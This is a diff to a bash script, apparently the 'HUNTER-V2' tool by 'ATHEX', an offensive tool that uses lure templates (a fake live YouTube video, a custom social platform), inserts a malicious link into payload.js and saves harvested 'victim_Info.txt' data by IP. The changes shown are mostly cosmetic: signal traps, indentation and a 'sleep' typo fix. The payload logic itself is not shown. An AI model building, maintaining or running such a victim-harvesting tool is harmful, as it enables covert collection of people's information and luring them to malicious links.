@@ -8,13 +8,13 @@ __VERSION__="2.0"
 __AUTHOR__="ATHEX"
 
 ### Script termination
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' 1
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' 2
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP
-
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' INT
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' TERM
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' TSTP
 
 function Desktop()
 {
+    clear
     printf "\033[1;33m                             CREATED  BY ~ \033[1;37mA T H E X\033[1;33m ~\n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "    ######## # ###### ###### # # ###### ######## ######## ######## ########     \n"
@@ -30,13 +30,11 @@ function Desktop()
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "\033[0m\n"
- 
-
-}                           
+}
 
 function Android()
 {
-    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"          #  
+    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"
     printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[$__VERSION__]\033[0m\033[1;33m__ \n"
     printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
     printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
@@ -60,17 +58,16 @@ function banner(){
     fi
 }
 
-
 function loading()
 {
-	dot=(. . .)
-	for i in "${dot[@]}"
-	do
-		printf "%s" "$i"
-		sleep 1
-	done
-	echo -e "\033[1;77m"
-	sleep 1
+    dot=(. . .)
+    for i in "${dot[@]}"
+    do
+        printf "%s" "$i"
+        sleep 1
+    done
+    echo -e "\033[1;77m"
+    sleep 1
 }
 
 function kill_Processors() 
@@ -405,9 +402,9 @@ function catch_victims()
     trap - INT
     kill_Processors
 
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' 1
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' 2
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' INT
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' TERM
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' TSTP
 
     dir="$ip/$d/victim_Info.txt"
     if [[ -n $ip ]]; then
@@ -449,7 +446,7 @@ function template()
     printf "   \033[1;33m[\033[1;37m03\033[1;33m] Live Youtube Video\n"
     printf "   \033[1;33m[\033[1;37m04\033[1;33m] Custom Social Platform\n\n"
     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Template to Used [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' temp
-    if  [[ $temp -gt 4 && $temp -lt 1 ]]; then
+    if [[ $temp -gt 4 && $temp -lt 1 ]]; then
         printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Template Option!\n"
         printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Try Again.\033[0m\n'
         sleep 2
@@ -510,11 +507,9 @@ function template()
 
 function templateSetup()
 {
-    # echo -e "$temp\n$mal_link\n$festName\n$subdomain"
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Preparing a template for the attack";loading
     sleep 2
 
-    # sed 's+malicious_link+'$mal_link'+g' template.php > index.php
     if [[ -f "payload.js" ]]; then
         sed 's+malicious_link+'$mal_link'+g' payload.js > payload1.js
     fi
@@ -925,7 +920,7 @@ function menu()
     fi
 
     if [[ $act == 1 ]] || [[ $act == 01 ]]; then
-        Sleep 2
+        sleep 2
         printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Hope you enjoy using \033[1;37mHUNTER-V2\033[1;31m.\033[0m\n"
         redirection
     elif [[ $act == 2 ]] || [[ $act == 02 ]]; then
